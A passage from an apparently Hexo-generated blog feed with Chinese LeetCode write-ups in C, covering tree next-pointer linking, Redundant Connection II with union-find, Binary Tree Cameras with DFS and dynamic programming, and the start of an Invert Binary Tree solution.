class="line">    &#123;</span><br><span class="line">        last_node-&gt;next = node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!next_start)</span><br><span class="line">    &#123;</span><br><span class="line">        next_start = node;</span><br><span class="line">    &#125;</span><br><span class="line">    last_node = node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct Node* <span class="title">connect</span><span class="params">(struct Node* root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">start</span> = <span class="title">root</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(start)</span><br><span class="line">    &#123;</span><br><span class="line">        last_node = <span class="literal">NULL</span>, next_start = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span>(start)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;left)</span><br><span class="line">                connectList(start-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(start-&gt;right)</span><br><span class="line">                connectList(start-&gt;right);</span><br><span class="line">            start = start-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        start = next_start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/15/p3if4WBZnAScgLI.png" alt="image.png"></p><h1 id="0x03-难度：困难"><a href="#0x03-难度：困难" class="headerlink" title="0x03.难度：困难"></a>0x03.难度：困难</h1><h2 id="0x00-冗余连接-II"><a href="#0x00-冗余连接-II" class="headerlink" title="0x00. 冗余连接 II"></a>0x00.<a href="https://leetcode-cn.com/problems/redundant-connection-ii/" target="_blank" rel="noopener"> 冗余连接 II</a></h2><blockquote><p>在本问题中，有根树指满足以下条件的有向图。该树只有一个根节点，所有其他节点都是该根节点的后继。每一个节点只有一个父节点，除了根节点没有父节点。</p><p>输入一个有向图，该图由一个有着N个节点 (节点值不重复1, 2, …, N) 的树及一条附加的边构成。附加的边的两个顶点包含在1到N中间，这条附加的边不属于树中已存在的边。</p><p>结果图是一个以边组成的二维数组。 每一个边 的元素是一对 [u, v]，用以表示有向图中连接顶点 u 和顶点 v 的边，其中 u 是 v 的一个父节点。</p><p>返回一条能删除的边，使得剩下的图是有N个节点的有根树。若有多个答案，返回最后出现在给定二维数组的答案。</p><p>示例 1:</p><p>输入: [[1,2], [1,3], [2,3]]<br>输出: [2,3]<br>解释: 给定的有向图如下:<br>1<br>/ <br>v   v<br>2–&gt;3<br>示例 2:</p><p>输入: [[1,2], [2,3], [3,4], [4,1], [1,5]]<br>输出: [4,1]<br>解释: 给定的有向图如下:<br>5 &lt;- 1 -&gt; 2<br>  ^    |<br>  |    v<br>  4 &lt;- 3<br>注意:</p><p>二维数组大小的在3到1000范围内。<br>二维数组中的每个整数在1到N之间，其中 N 是二维数组的大小。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/redundant-connection-ii" target="_blank" rel="noopener">https://leetcode-cn.com/problems/redundant-connection-ii</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：该题为2020.9.17的每日一题</p></blockquote><h4 id="解法：并查集-1"><a href="#解法：并查集-1" class="headerlink" title="解法：并查集"></a>解法：并查集</h4><p>半夜三点多把前置题：<a href="https://leetcode-cn.com/problems/redundant-connection/" target="_blank" rel="noopener">684. 冗余连接</a>给做了，感觉稍微有了点头绪，<del>其实还是啥都不知道</del>…</p><p>晚上大概想清楚了，同样是采用并查集的思想，不过考虑到该图为有向图，同时题目给定的图<strong>必定有且仅有一条多余的边使得该图无法成为一颗树</strong></p><p>可能存在如下情况：</p><ul><li><strong>一个节点的入度大于等于2</strong>（<strong>存在两个及以上父结点，本题数据构造保证只可能存在两个父结点的情况</strong>）</li><li><strong>图中存在回路</strong></li><li><strong>以上两种情况同时存在</strong></li></ul><p>如下图所示（字丑见谅QwQ）：</p><p><img src="https://i.loli.net/2020/09/18/HTi1XVUF7SuIRM3.png" alt="33A2C56517F4926A49A4C03363AECFD0.png"></p><p>故我们很容易（并不Or2）能够得到解开这道题的算法：</p><ul><li><strong>将每一个结点初始化为一棵单独的树，其父结点初始化为自身</strong></li><li><strong>使用两个数组分别保存每个结点的父结点与所属的树的根结点</strong></li><li><strong>遍历每一条边，重新记录下每个结点的父结点与根节点</strong></li><li><strong>当一个结点的入度大于1时（出现第二个不是自身结点的父亲），记录该边为争议边</strong></li><li><strong>当一条边的始末结点同属于一棵树时，记录该条边为回路边</strong></li><li><strong>两种情况都不存在，则将该边的末结点的父结点标为该边的始结点，并合并两结点所在的树</strong></li><li><strong>当争议边不存在时，直接删除回路边</strong></li><li><strong>争议边若存在，若同时存在回路边，则删除争议边末尾结点及其父结点所构成边，否则删除争议边</strong></li></ul><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> * ancestors;<span class="comment">//（并查集）记录每个节点的根结点</span></span><br><span class="line"><span class="keyword">int</span> * parent;<span class="comment">//记录每个节点的父结点</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_x</span><span class="params">(<span class="keyword">int</span> x)</span><span class="comment">//查找该结点所属树的根结点</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x == ancestors[x] ? x : (ancestors[x] = find_x(ancestors[x]));<span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union_ancestor</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ancestors[find_x(a)] = find_x(b);<span class="comment">//将两棵树合并为一棵树</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">findRedundantDirectedConnection</span><span class="params">(<span class="keyword">int</span>** edges, <span class="keyword">int</span> edgesSize, <span class="keyword">int</span>* edgesColSize, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    ancestors = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    parent = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        parent[i] = ancestors[i] = i;<span class="comment">//初始化每个结点为单独的一棵树（并查集），结点的父结点标记为自身</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//conflict：可能存在争议的边</span></span><br><span class="line">    <span class="comment">//circle：可能形成回路的边</span></span><br><span class="line">    <span class="keyword">int</span> start, <span class="built_in">end</span>, a_start, a_end, conflict = <span class="number">-1</span>, <span class="built_in">circle</span> = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">end</span> = edges[i][<span class="number">1</span>];</span><br><span class="line">        a_start = find_x(start);</span><br><span class="line">        a_end = find_x(<span class="built_in">end</span>);</span><br><span class="line">        <span class="keyword">if</span>(parent[<span class="built_in">end</span>] != <span class="built_in">end</span>)<span class="comment">//该条边的尾结点已经与其他结点相连（即加上这条边后入度大于1）</span></span><br><span class="line">        &#123;</span><br><span class="line">            conflict = i;<span class="comment">//记录该条边为争议边</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            parent[<span class="built_in">end</span>] = start;</span><br><span class="line">            <span class="keyword">if</span>(a_start == a_end)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">circle</span> = i;<span class="comment">//该条边两结点的根结点相同，可能形成回路</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                union_ancestor(start, <span class="built_in">end</span>);<span class="comment">//将两棵树合并为一棵树（并查集）</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> *ret = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(conflict&lt;<span class="number">0</span>)<span class="comment">//不存在争议边，只存在形成回路的边</span></span><br><span class="line">    &#123;</span><br><span class="line">        ret[<span class="number">0</span>] = edges[<span class="built_in">circle</span>][<span class="number">0</span>];</span><br><span class="line">        ret[<span class="number">1</span>] = edges[<span class="built_in">circle</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//存在争议边</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">circle</span>&gt;<span class="number">0</span>)<span class="comment">//同时存在回路边</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = parent[edges[conflict][<span class="number">1</span>]];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = edges[conflict][<span class="number">0</span>];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/IahfqNWwzCoA6GU.png" alt="image.png"></p><h2 id="0x01-监控二叉树"><a href="#0x01-监控二叉树" class="headerlink" title="0x01. 监控二叉树"></a>0x01.<a href="https://leetcode-cn.com/problems/binary-tree-cameras/" target="_blank" rel="noopener"> 监控二叉树</a></h2><blockquote><p>给定一个二叉树，我们在树的节点上安装摄像头。</p><p>节点上的每个摄影头都可以监视其父对象、自身及其直接子对象。</p><p>计算监控树的所有节点所需的最小摄像头数量。</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_01.png" alt="image.png"></p><p>输入：[0,0,null,0,0]<br>输出：1<br>解释：如图所示，一台摄像头足以监控所有节点。<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_02.png" alt="image.png"></p><p>输入：[0,0,null,0,null,0,null,null,0]<br>输出：2<br>解释：需要至少两个摄像头来监视树的所有节点。 上图显示了摄像头放置的有效位置之一。</p><p>提示：</p><p>给定树的节点数的范围是 [1, 1000]。<br>每个节点的值都是 0。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/binary-tree-cameras" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-tree-cameras</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>该题为2020.9.22的每日一题</p></blockquote><p>仔细想想，对于一个结点是否需要安装摄像头，其实是<strong>由其子树的状态来决定的</strong>，那么我们可以使用<strong>动态规划算法</strong></p><h3 id="解法：递归-深度优先搜索（DFS）-动态规划（DP）"><a href="#解法：递归-深度优先搜索（DFS）-动态规划（DP）" class="headerlink" title="解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）"></a>解法：递归 + 深度优先搜索（DFS） + 动态规划（DP）</h3><p>大概如下图所示：<br><img src="https://i.loli.net/2020/09/22/5v4sz9fdl2OLau7.png" alt="image.png"></p><p>我们考虑有以下几种情况：</p><ul><li><strong>当一个结点的左或右子树没有被摄像头覆盖上时，这个结点必须要安装一个摄像头来监测其左或右子树，定义为状态码STATUS_CAMERA</strong></li><li><strong>当一个结点的左右子树都已经被摄像头覆盖上时，为了实现摄像头数量的最小化，需要在该结点的父结点放置摄像头，即在回到父结点前该结点都是未被覆盖的，定义为状态码STATUS_UNCOVERED</strong></li><li><strong>当一个结点的左右子树中存在摄像头，则该结点肯定是被覆盖了的，定义为状态码STATUS_COVERED</strong></li><li><strong>对于结点为NULL的情况，我们可以默认他是被覆盖了的结点，即定义为状态码STATUS_COVERED</strong></li></ul><p>同时，<strong>我们还需要对这棵树的根节点做一次单独的检测，以确定是否要在其上放置摄像头</strong></p><p>为了方便判定，我们将STATUS_CAMERA设置为状态码中值相对大的一个</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * status code</span></span><br><span class="line"><span class="comment"> * 0: waiting for pwn</span></span><br><span class="line"><span class="comment"> * 1: has been pwn</span></span><br><span class="line"><span class="comment"> * 2: camara here</span></span><br><span class="line"><span class="comment"> *-1: inner error, just a placeholder in fact</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_UNCOVERED 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_COVERED 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_CAMERA 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STATUS_ERROR -1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">minCameraCover</span><span class="params">(struct TreeNode* root)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> amounts=<span class="number">0</span>;<span class="comment">//amounts of camera</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//add a camera to the root if status of root is 0</span></span><br><span class="line">    <span class="keyword">if</span>(dfs(root,&amp;amounts) == STATUS_UNCOVERED)</span><br><span class="line">        amounts++;</span><br><span class="line">    <span class="keyword">return</span> amounts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> * amounts)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//NULL pointer signed as status 1</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the status of left and right node</span></span><br><span class="line">    <span class="keyword">int</span> left = dfs(root-&gt;left, amounts);</span><br><span class="line">    <span class="keyword">int</span> right = dfs(root-&gt;right, amounts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if one of both uncovered yet, a camera is needed</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED)</span><br><span class="line">    &#123;</span><br><span class="line">        (*amounts)++;</span><br><span class="line">        <span class="keyword">return</span> STATUS_CAMERA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if both are covered, father's of root may need a camera</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNCOVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if there's at least one camera in both childs, the root is covered</span></span><br><span class="line">    <span class="keyword">if</span>(left + right &gt; STATUS_CAMERA)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//error code(not used)</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/64ytrK3gLNGowbf.png" alt="EE8895_CCLKZDA_OPW4_FT1.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-绪论&quot;&gt;&lt;a href=&quot;#0x00-绪论&quot; class=&quot;headerlink&quot; title=&quot;0x00.绪论&quot;&gt;&lt;/a&gt;0x00.绪论&lt;/h1&gt;&lt;p&gt;本来不想这么快又开一篇新的blog的（&lt;del&gt;毕竟一篇OJ就是一个坑，前面的好多坑才刚刚开挖&lt;/del&gt;），不过因为刚好做了每日一题的前置题目而刚好这道题又是树/图题所以想找个地方记录下来因此就开了一篇新博客&lt;/p&gt;
&lt;p&gt;题好难做啊.jpg&lt;/p&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="算法" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="题解" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="动态规划" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="链表" scheme="http://archive.next.arttnba3.cn/tags/%E9%93%BE%E8%A1%A8/"/>
    
    <category term="树" scheme="http://archive.next.arttnba3.cn/tags/%E6%A0%91/"/>
    
    <category term="二叉树" scheme="http://archive.next.arttnba3.cn/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="图论" scheme="http://archive.next.arttnba3.cn/tags/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="无向图" scheme="http://archive.next.arttnba3.cn/tags/%E6%97%A0%E5%90%91%E5%9B%BE/"/>
    
    <category term="并查集" scheme="http://archive.next.arttnba3.cn/tags/%E5%B9%B6%E6%9F%A5%E9%9B%86/"/>
    
    <category term="深度优先搜索（DFS）" scheme="http://archive.next.arttnba3.cn/tags/%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88DFS%EF%BC%89/"/>
    
    <category term="广度优先搜索（BFS）" scheme="http://archive.next.arttnba3.cn/tags/%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%EF%BC%88BFS%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>【OJ-0x0004-Leetcode】每日一题部分write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/16/%E3%80%90OJ-0x0004-Leetcode%E3%80%91%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/16/%E3%80%90OJ-0x0004-Leetcode%E3%80%91%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-16T10:52:28.000Z</published>
    <updated>2020-11-11T14:59:49.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>为了保持编程的一个手感（毕竟疫情以来打的代码比以前少得多了），同时也为了提高自己的姿势水平（x），打算从今天开始刷Leetcode提供的每日一题并在此做一个小小的记录（x）</p><p>希望几年以后这里已经积累了上千道题⑧（<del>没可能的</del></p><img src="https://i.loli.net/2020/10/15/rqasE7pNAxQXy9l.png" alt="image.png" style="zoom:50%;" /><a id="more"></a><h1 id="0x01-2020"><a href="#0x01-2020" class="headerlink" title="0x01. 2020"></a>0x01. 2020</h1><h2 id="September"><a href="#September" class="headerlink" title="September"></a>September</h2><h3 id="16-226-翻转二叉树（简单）"><a href="#16-226-翻转二叉树（简单）" class="headerlink" title="16 - 226. 翻转二叉树（简单）"></a>16 - <a href="https://leetcode-cn.com/problems/invert-binary-tree/" target="_blank" rel="noopener">226. 翻转二叉树（简单）</a></h3><blockquote><p>翻转一棵二叉树。</p><p><strong>示例：</strong></p><p>输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  2     7</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">1   3 6   9</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">     4</span><br><span class="line">   &#x2F;   \</span><br><span class="line">  7     2</span><br><span class="line"> &#x2F; \   &#x2F; \</span><br><span class="line">9   6 3   1</span><br></pre></td></tr></table></figure><p><strong>备注:</strong><br>这个问题是受到 <a href="https://twitter.com/mxcl" target="_blank" rel="noopener">Max Howell </a>的 <a href="https://twitter.com/mxcl/status/608682016205344768" target="_blank" rel="noopener">原问题</a> 启发的 ：</p><blockquote><p>谷歌：我们90％的工程师使用您编写的软件(Homebrew)，但是您却无法在面试时在白板上写出翻转二叉树这道题，这太糟糕了。</p></blockquote></blockquote><p>很常规的也很简单的一道题目，只需<strong>逐层交换左右节点</strong>即可（<del>homebrew的开发者居然写不出这个题么</del>（<del>估计是太紧张le</del>（<del>👈不要在意这家伙天天乱讲</del></p><h4 id="解法一：递归"><a href="#解法一：递归" class="headerlink" title="解法一：递归"></a>解法一：递归</h4><p>一层一层交换结点的做法，我们很容易就想到递归，故构造代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">invertTree</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> * <span class="title">temp</span>;</span></span><br><span class="line">    temp = root-&gt;left;</span><br><span class="line">    root-&gt;left = root-&gt;right;</span><br><span class="line">    root-&gt;right = temp;</span><br><span class="line">    invertTree(root-&gt;left);</span><br><span class="line">    invertTree(root-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，递归调用会占用大量的栈空间（每次进行函数调用都会生成一个新的栈帧），所以空间复杂度上不是很好看（</p><p><img src="https://i.loli.net/2020/09/16/PaIkMX54n7zH1bJ.png" alt="image.png"></p><h4 id="解法二：广度优先搜索（队列）"><a href="#解法二：广度优先搜索（队列）" class="headerlink" title="解法二：广度优先搜索（队列）"></a>解法二：广度优先搜索（队列）</h4><p>大概过程如下：</p><ul><li>头结点入队</li><li>交换左右结点</li><li>左右结点入队</li><li>头结点出队</li></ul><p>队列为空时停止即可</p><p>因为数据范围不像OI那么变态（x），所以直接用一个很小的数组来储存即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode 